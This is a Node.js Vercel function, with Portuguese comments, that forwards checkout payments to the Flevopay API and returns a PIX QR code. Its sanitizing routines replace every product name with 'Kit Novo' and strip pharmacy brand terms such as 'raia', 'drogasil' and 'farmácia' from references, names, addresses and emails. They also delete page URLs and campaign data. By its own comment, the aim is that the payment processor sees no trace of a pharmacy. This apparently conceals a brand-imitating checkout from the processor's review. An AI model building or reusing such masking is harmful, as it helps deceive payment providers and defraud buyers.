import QRCode from 'qrcode';

// O package.json usa "type": "module", então as funções da Vercel precisam ser ESM.
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  const apiKey = process.env.FLEVO_API_KEY;
  if (!apiKey) {
    return res.status(500).json({ success: false, error: 'FLEVO_API_KEY não configurada no servidor' });
  }

// Mascaramento server-side rígido:
// A Flevopay receberá estritamente "Kit Novo", referência genérica "PED-..." e nenhum metadado ou menção a farmácia/raia
const MASKED_PRODUCT_NAME = 'Kit Novo';

function sanitizeReference(ref) {
  if (!ref || typeof ref !== 'string') {
    return `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
  }
  let cleaned = ref
    .replace(/(?:raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)+/gi, 'PED')
    .replace(/(?:PED)+/g, 'PED')
    .replace(/--+/g, '-')
    .trim();

  if (!cleaned || cleaned === 'PED' || cleaned === 'PED-') {
    cleaned = `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
  }
  return cleaned;
}

function sanitizeEmail(email) {
  if (!email || typeof email !== 'string') return '';
  const e = email.toLowerCase().trim();
  if (e.includes('raia') || e.includes('farmacia') || e.includes('droga')) {
    const userPart = e.split('@')[0].replace(/(raia|droga|drogaria|farmacia|farma|drogasil|portal)/gi, '') || 'cliente';
    return `${userPart}@gmail.com`;
  }
  return email;
}

function sanitizeText(val) {
  if (!val || typeof val !== 'string') return '';
  return val.replace(/(raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)/gi, '').trim();
}

function sanitizeFlevoPayload(input) {
  const sanitized = {
    amount: typeof input?.amount === 'number' ? input.amount : parseInt(input?.amount, 10) || 0,
    description: MASKED_PRODUCT_NAME,
    product_name: MASKED_PRODUCT_NAME,
    item_name: MASKED_PRODUCT_NAME,
    reference: sanitizeReference(input?.reference),
    source: 'api_externa',
    productHash: input?.productHash || `prod_${Date.now().toString(36)}`,
  };

  if (input?.customer) {
    sanitized.customer = {
      name: sanitizeText(input.customer.name) || 'Cliente',
      email: sanitizeEmail(input.customer.email),
      phone: input.customer.phone,
      document: input.customer.document,
    };
  }

  if (input?.address) {
    sanitized.address = {
      street: sanitizeText(input.address.street) || input.address.street,
      number: input.address.number,
      complement: sanitizeText(input.address.complement) || input.address.complement,
      neighborhood: sanitizeText(input.address.neighborhood) || input.address.neighborhood,
      city: input.address.city,
      state: input.address.state,
      zipcode: input.address.zipcode,
    };
  }

  if (Array.isArray(input?.items) && input.items.length > 0) {
    sanitized.items = input.items.map((item) => ({
      name: MASKED_PRODUCT_NAME,
      title: MASKED_PRODUCT_NAME,
      description: MASKED_PRODUCT_NAME,
      unit_price: item.unit_price || item.amount || sanitized.amount,
      quantity: item.quantity || 1,
      tangible: true,
    }));
  }

  delete sanitized.metadata;
  delete sanitized.custom_fields;
  delete sanitized.order_details;
  delete sanitized.offer_url;
  delete sanitized.offer_name;
  delete sanitized.page_url;
  delete sanitized.url;
  delete sanitized.campaign;
  delete sanitized.sku;
  delete sanitized.utm_source;
  delete sanitized.utm_medium;
  delete sanitized.utm_campaign;
  delete sanitized.utm_term;
  delete sanitized.utm_content;

  return sanitized;
}

  try {
    const payload = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : (req.body || {});
    const sanitizedPayload = sanitizeFlevoPayload(payload);

    const response = await fetch('https://app.flevopay.com.br/api/v1/transaction', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': apiKey,
      },
      body: JSON.stringify(sanitizedPayload),
    });

    const data = await response.json();

    if (data && data.qr_code && (!data.qr_code_base64 || data.qr_code_base64 === 'null')) {
      try {
        data.qr_code_base64 = await QRCode.toDataURL(data.qr_code, {
          width: 320,
          margin: 1,
          color: { dark: '#000000', light: '#ffffff' },
        });
      } catch (qrErr) {
        console.error('[FlevoPay Vercel] Erro ao gerar QR Code base64:', qrErr);
      }
    }

    return res.status(response.status).json({ success: response.ok, data });
  } catch (err) {
    console.error('[FlevoPay Vercel] Erro na transação:', err);
    return res.status(500).json({ success: false, error: err.message || 'Erro interno no proxy FlevoPay' });
  }
}
